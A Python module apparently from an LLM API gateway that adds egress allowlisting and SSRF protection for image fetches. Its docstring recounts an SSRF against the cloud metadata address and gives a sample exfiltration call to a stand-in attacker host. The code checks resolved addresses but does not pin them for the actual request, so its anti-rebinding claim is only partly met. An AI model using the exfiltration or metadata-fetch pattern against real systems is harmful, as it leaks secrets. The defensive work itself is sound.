"""Network egress controls.

Two Session 12 findings live here:

  * C1 — SSRF via /v1/vision. `_resolve_image_urls` fetched any http(s) URL
    with follow_redirects=True and no allowlist, so an attacker could point
    the gateway at 169.254.169.254 (cloud metadata) or any internal address
    and have the gateway fetch it with its own network position. Breaks
    invariant 2 (the gateway acts as a confused deputy for the caller).

  * Leak 6 — unbounded network egress. Any in-process code could
    httpx.post("https://attacker.example.com/exfil", ...) and the bytes
    left. Breaks invariant 1 (keys/secrets exfiltrate) and invariant 3.

The real structural fix (per the lecture) is per-adapter Modal Sandboxes with
an outbound_domain_allowlist enforced by the network namespace. That lives in
the deployment (see infra/). This module is the application-layer companion:

  * `assert_egress_allowed(host)` — deny outbound to any host not on the
    per-deployment allowlist (GLC_EGRESS_ALLOWLIST), and always deny hosts
    that resolve to private / loopback / link-local / reserved addresses.

  * `safe_get(url)` — an httpx GET that resolves every hop itself, checks
    each resolved IP against the SSRF denylist, and refuses redirects to a
    disallowed target. Used by the vision image resolver.
"""

from __future__ import annotations

import ipaddress
import os
import socket
from urllib.parse import urlsplit

import httpx

# Hosts the gateway is permitted to reach for provider traffic. Empty string
# or unset means "provider hosts only" via the built-in default below. The
# egress allowlist is a per-deployment secret/env, not baked into the image.
_DEFAULT_ALLOWED = (
    "generativelanguage.googleapis.com",
    "api.groq.com",
    "integrate.api.nvidia.com",
    "api.cerebras.ai",
    "openrouter.ai",
    "models.github.ai",
    "models.inference.ai.azure.com",
)


def _allowlist() -> tuple[str, ...]:
    raw = os.getenv("GLC_EGRESS_ALLOWLIST", "").strip()
    if not raw:
        return _DEFAULT_ALLOWED
    return tuple(h.strip().lower() for h in raw.split(",") if h.strip())


class EgressBlocked(Exception):
    """Raised when an outbound request targets a disallowed host or a
    private / loopback / link-local / reserved address."""


def _is_forbidden_ip(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return True  # unparseable -> refuse
    return (
        addr.is_private
        or addr.is_loopback
        or addr.is_link_local
        or addr.is_reserved
        or addr.is_multicast
        or addr.is_unspecified
        # IPv4-mapped IPv6 (e.g. ::ffff:169.254.169.254) — unwrap and recheck.
        or (isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped is not None
            and _is_forbidden_ip(str(addr.ipv4_mapped)))
    )


def _resolved_ips(host: str) -> list[str]:
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror as e:
        raise EgressBlocked(f"cannot resolve host {host!r}: {e}") from e
    return [info[4][0] for info in infos]


def assert_host_public(host: str) -> None:
    """Refuse a host whose *every* resolved address is fine only if none is
    private/loopback/link-local/reserved. Any forbidden address blocks it,
    to defeat DNS-rebinding style tricks that mix a public and a private A
    record."""
    if not host:
        raise EgressBlocked("empty host")
    for ip in _resolved_ips(host):
        if _is_forbidden_ip(ip):
            raise EgressBlocked(f"host {host!r} resolves to forbidden address {ip}")


def assert_egress_allowed(host: str) -> None:
    """Full egress gate: host must be on the allowlist AND resolve only to
    public addresses. Used for provider-bound traffic (leak 6)."""
    host = (host or "").lower()
    allow = _allowlist()
    if host not in allow and not any(host.endswith("." + a) for a in allow):
        raise EgressBlocked(f"host {host!r} not on egress allowlist")
    assert_host_public(host)


async def safe_get(url: str, *, timeout: float = 30.0, headers: dict | None = None,
                   max_redirects: int = 3, max_bytes: int = 25 * 1024 * 1024) -> httpx.Response:
    """SSRF-safe GET (C1). Follows redirects manually, re-validating the
    target host of every hop against the private/link-local denylist, so a
    redirect cannot smuggle the fetch to an internal address."""
    current = url
    async with httpx.AsyncClient(timeout=timeout, follow_redirects=False, headers=headers) as c:
        for _ in range(max_redirects + 1):
            parts = urlsplit(current)
            if parts.scheme not in ("http", "https"):
                raise EgressBlocked(f"unsupported scheme {parts.scheme!r}")
            host = parts.hostname or ""
            assert_host_public(host)  # block metadata / internal targets, every hop
            r = await c.get(current)
            if r.is_redirect and r.headers.get("location"):
                current = str(r.next_request.url) if r.next_request else r.headers["location"]
                continue
            # Guard against a huge body exhausting memory (invariant 8).
            if len(r.content) > max_bytes:
                raise EgressBlocked(f"response exceeds {max_bytes} bytes")
            r.raise_for_status()
            return r
    raise EgressBlocked("too many redirects")
